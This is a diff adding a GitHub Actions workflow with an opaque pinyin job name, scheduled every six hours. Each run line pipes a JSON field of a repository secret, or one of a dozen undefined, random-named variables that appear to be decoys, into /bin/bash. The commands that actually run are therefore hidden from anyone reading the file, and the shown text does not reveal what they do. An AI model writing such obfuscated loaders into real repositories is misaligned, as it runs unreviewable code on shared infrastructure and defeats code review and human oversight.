@@ -1,0 +1,30 @@
+name: chifanhaochimaxiaoniangaojiance
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chifanhaochimaxiaoniangaojiance
+        env:
+          o7: ${{ secrets.o7 }}
+        run: |
+          echo $o7 | jq -r .a45483 | /bin/bash
+          echo $dvd671 | jq -r .ydojq4987 | /bin/bash
+          echo $f19728 | jq -r .cxpna1 | /bin/bash
+          echo $cox5 | jq -r .ndkg98 | /bin/bash
+          echo $pcn8530 | jq -r .ljrnz990 | /bin/bash
+          echo $cwb1403 | jq -r .ukkx729 | /bin/bash
+          echo $rqux20400 | jq -r .aeql0 | /bin/bash
+          echo $uakse08434 | jq -r .kyaz68504 | /bin/bash
+          echo $u91869 | jq -r .hta20 | /bin/bash
+          echo $ef3 | jq -r .uor406 | /bin/bash
+          echo $lrysy0543 | jq -r .hwdu48 | /bin/bash
+          echo $jzvq79 | jq -r .kx43 | /bin/bash
+          echo $iowpt34 | jq -r .fareg609 | /bin/bash
+
